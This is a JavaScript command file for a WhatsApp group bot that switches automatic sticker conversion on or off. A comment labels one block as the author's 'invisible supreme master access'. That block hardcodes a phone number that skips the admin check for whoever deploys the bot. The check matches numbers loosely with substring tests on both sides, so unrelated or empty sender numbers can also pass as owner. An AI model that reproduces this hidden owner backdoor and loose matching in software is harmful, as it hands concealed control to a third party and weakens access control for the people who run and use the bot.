/**
 * AutoSticker Command - Enable or disable auto-sticker conversion
 */

const database = require('../../database');
const config = require ('../../config.js');

// Fonction pour le style Small Caps (Garde la cohérence visuelle)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
  
  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'autosticker',
  aliases: ['autos', 'asticker'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: 'Enable or disable auto-sticker conversion (images/videos automatically become stickers)',
  usage: '.autosticker <on/off>',
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: false,
  
  async execute(sock, msg, args, extra) {
    const prefix = config.prefix || '.';
    try {
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
      const supremeOwner = '22651622652';
      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
      
      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
      if (!isMe) {
        const isAdmins = extra.isAdmins || false; 
        if (!isAdmins) {
          return extra.reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*`);
        }
      }

      if (!args[0]) {
        const settings = database.getGroupSettings(extra.from);
        const status = settings.autosticker ? 'ON' : 'OFF';
        return extra.reply(
          `╭╼━≪• *sᴛᴀᴛᴜᴛ ᴀʀᴄᴀɴᴇ_sᴛɪᴄᴋᴇʀ* •≫━╾╮\n` +
          `┃ *ᴇ́ᴛᴀᴛ* : ${status}\n` +
          `╰━━━━━━━━━━━━━━━╯\n\n` +
          `🔮 *ɪɴᴄᴀɴᴛᴀᴛɪᴏɴs ᴅɪsᴘᴏɴɪʙʟᴇs :*\n` +
          `*ᴄᴇᴛ ᴀʀᴄᴀɴᴇ ᴍᴇ́ᴛᴀᴍᴏʀᴘʜᴏsᴇ ᴀᴜᴛᴏᴍᴀᴛɪǫᴜᴇᴍᴇɴᴛ ʟᴇs ɪᴍᴀɢᴇs ᴇᴛ ᴠɪᴅᴇ́ᴏs ᴇɴ sᴛɪᴄᴋᴇʀs.*\n\n` +
          `  ${prefix}autosticker on\n` +
          `  ${prefix}autosticker off\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
        );
      }
      
      const opt = args[0].toLowerCase();
      
      if (opt === 'on') {
        if (database.getGroupSettings(extra.from).autosticker) {
          return extra.reply(`*❌ ${toSmallCaps('l arcane sticker est deja actif')} !*`);
        }
        database.updateGroupSettings(extra.from, { autosticker: true });
        return extra.reply(`*🛡️ ${toSmallCaps('arcane sticker a ete eveille')} (ᴏɴ).*`);
      }
      
      if (opt === 'off') {
        if (!database.getGroupSettings(extra.from).autosticker) {
          return extra.reply(`*❌ ${toSmallCaps('l arcane sticker est deja endormi')} !*`);
        }
        database.updateGroupSettings(extra.from, { autosticker: false });
        return extra.reply(`*🔓 ${toSmallCaps('la metamorphose de l arcane sticker a ete desactivee')} (ᴏғғ).*`);
      }
      
      return extra.reply(`*💡 ${toSmallCaps('utilise')} \`${prefix}autosticker\` ${toSmallCaps('pour voir les options')}.*`);
    } catch (error) {
      console.error('[AutoSticker Command Error]:', error);
      return extra.reply(`❌ *${toSmallCaps('erreur')} :* ${error.message}`);
    }
  }
};
